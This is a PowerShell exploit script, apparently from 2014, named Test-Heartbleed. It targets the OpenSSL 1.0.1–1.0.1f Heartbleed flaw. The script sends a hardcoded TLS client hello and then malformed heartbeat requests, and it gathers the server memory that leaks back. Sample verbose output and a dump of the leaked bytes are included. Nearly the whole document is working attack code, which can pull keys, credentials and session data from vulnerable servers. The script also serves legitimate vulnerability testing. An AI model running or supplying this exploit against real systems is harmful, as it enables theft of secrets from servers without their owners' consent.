<#
.SYNOPSIS

Exploit the OpenSSL 1.0.1 - 1.0.1f TLS HeartBeat vulnerability.
Author: Joff Thyer, April 2014
Concept suggestion by Tim Tomes.

.DESCRIPTION

Sends a malformed TLS heartbeat request as many times as you want to and write
the returned data into a file.

.PARAMETER Hostname

Either a domain name or IP address can be provided.

.PARAMETER Port

The default TCP port is 443 however any other port may be specified
here.

.PARAMETER TLSTries

Perform a full TLS connection to the server this many times. The default
for this parameter is 3. More data may be leaked with continued connect
attempts.

.PARAMETER Heartbeats

For a single TLS connection, send this many heartbeat requests
and gather the resulting data.  This defaults to 3 also.

.PARAMETER NoRandomDelay

Disable the random delay between heartbeat requests.  The random
delay will be calculated between 0 and 1000 milliseconds.

.PARAMETER Timeout

The TCP timeout for a connect request.  Also this is the
read bytes timeout during the response reading.  This will
timeout if the server does not support the TLS heartbeat function.

.PARAMETER STARTTLS

A boolean parameter that if true will send the plaintext "STARTTLS"
command before sending the TLS client hello.

.LINK

http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html

.NOTES

Author: Joff Thyer, April 2014
Version: 20140414-1501
Acknowledgments to Tim Tomes.

.EXAMPLE

Test-Heartbleed -ComputerName 192.168.1.100 -Verbose
VERBOSE: Connection attempt number: 1
VERBOSE: Sending 3 TLS heartbeat packets
VERBOSE: :   226 bytes returned from server. (226 total bytes)
VERBOSE: :     0 bytes returned from server. (226 total bytes)
VERBOSE: :     0 bytes returned from server. (226 total bytes)
VERBOSE: Connection attempt number: 2
VERBOSE: Sending 3 TLS heartbeat packets
VERBOSE: :     7 bytes returned from server. (233 total bytes)
VERBOSE: :     0 bytes returned from server. (233 total bytes)
VERBOSE: :     0 bytes returned from server. (233 total bytes)
VERBOSE: Connection attempt number: 3
VERBOSE: Sending 3 TLS heartbeat packets
VERBOSE: :     7 bytes returned from server. (240 total bytes)
VERBOSE: :     0 bytes returned from server. (240 total bytes)
VERBOSE: :     0 bytes returned from server. (240 total bytes)
VERBOSE: Writing 240 total bytes to '192.168.1.100-hbdata.dat'

PS C:\> Get-Content .\192.168.1.100-hbdata.dat -Encoding Ascii
?I4a+?`??v<W????%D?|?????r?$??V.@?v????
???????h??u??????7?/3;????nO?i???? ?!?'&?.????m?????#?]?S0|oh??b???~XeSON?2`??/S???H?h???E??y???2??=????
!?M?\U???k?
(?V5??-?)?????????[Lu?X<N??#?' ?
*a??vA     F F F 
#>

function Test-Heartbleed 
{
    [CmdletBinding()]
    Param(
        [Parameter(
            Mandatory=$true,
            HelpMessage = "IP address or hostname to check",
            ValueFromPipelineByPropertyName = $true,
            Position = 0)]
            [Alias('IP', 'Host', 'Computer', 'Target')]
            [string[]]$Computername,

        [Parameter(
            HelpMessage="TCP port number that SSL application is listening on",
            ValueFromPipelineByPropertyName = $true,
            Position = 1)]
            [int]$Port=443,

        [Parameter(
            HelpMessage="Number of TLS connection attempts to make")]
            [int]$TLSTries=3,

        [Parameter(
            HelpMessage="Number of heartbeats to send")]
            [int]$Heartbeats=3,

        [Parameter(
            HelpMessage="TCP and read connection timeout")]
            [int]$Timeout=1000,
        
        [Parameter(
            HelpMessage="Whether to randomly delay between heartbeats")]
            [switch]$NoRandomDelay=$false,
        
        [Parameter(
            HelpMessage="Enable to send the plaintext STARTTLS command.")]
            [switch]$STARTTLS=$false
    )
    Begin
    {
        $tls_clienthello = [Byte[]] (
        0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
        0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
        0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
        0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
        0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
        0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
        0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
        0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
        0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
        0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
        0x01)

        $heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 )
    }

    Process
    {
        $ErrorActionPreference = "Continue"
        foreach($computer in $Computername)
        {
            $vulnerable = $true
            Write-Verbose -Message "Testing $($computer)"
            $IP = [System.Net.Dns]::GetHostByName($computer).AddressList[0].IPAddressToString
            $offset = 0
            $temp = New-Object -TypeName Byte[] 16384
            $buf = New-Object -TypeName Byte[] 8388608

            for ($nt = 0; $nt -lt $TLSTries; $nt++) {
                $msg = "Connection attempt number: {0}" -f ($nt + 1)
                Write-Verbose -Message $msg
                Try {
                    $tcp = New-Object -TypeName System.Net.Sockets.TcpClient
                    $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
                    $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)

                    if (!$wait) 
                    {
                        Throw [System.Exception] "TCP Connection Timeout Exceeded"
                    }
            
                    $tcp.EndConnect($conn)
                    $stream = $tcp.GetStream()

                    # send starttls if we need to
            
                    if ($STARTTLS) 
                    {
                        # any bytes waiting?  read them...
                        $awh = $stream.BeginRead($temp,0,$temp.Length,$null,$null)
                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                        $n = $stream.EndRead($awh)

                        # send the STARTTLS command
                        $st = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n`r`n")
                        $stream.Write($st,0,$st.Length)
                        $n = $stream.Read($temp,0,$temp.length)
                    }

                    # send TLS client hello
                    $stream.Write($tls_clienthello,0,$tls_clienthello.Length)

                    # get TLS server hello
                    $n = $stream.Read($temp,0,$temp.length)
            
                    if ( $temp[0] -ne 0x16) 
                    {
                        Throw [System.Exception] "Malformed TLS Server Hello"
                    }

                    Write-Verbose -Message "Sending $($Heartbeats) TLS heartbeat packets"
                    for ($i=0; $i -lt $Heartbeats; $i++) 
                    {
                        $stream.Write($heartbeat,0,$heartbeat.Length)

                        $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                
                        if(!$wait) 
                        {
                            Write-Verbose -Message "No Response to TLS HeartBeat() request on $($computer). Attepmp $($nt)."
                            $vulnerable = $false
                            break
                        }
                        Try
                        {
                            $n = $stream.EndRead($awh)
                            $offset += $n
                        }
                        Catch
                        {
                            Write-Verbose -Message "Could not read response from host $($computer). Attepmp $($nt)."
                            $vulnerable = $false
                            break
                        }

                        $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
                        Write-Verbose -Message $msg
                
                        if (!$NoRandomDelay) 
                        {
                            $sleeptime = Get-Random -Minimum 0 -Maximum 500
                            Start-Sleep -Milliseconds $sleeptime
                        }
                    }
                }
                Catch 
                {
                    Throw
                }
                Finally 
                {
                    $tcp.close()
                }
            }

            $result = New-Object -TypeName psobject -Property @{
                "Host" = $computer
                "Vulnerable" = $vulnerable
                "Bytes" = ($buf[0..$offset])
                "String" = [System.Text.Encoding]::ASCII.GetString(($buf[0..$offset]))
                
            }
            $result

        }
    }
}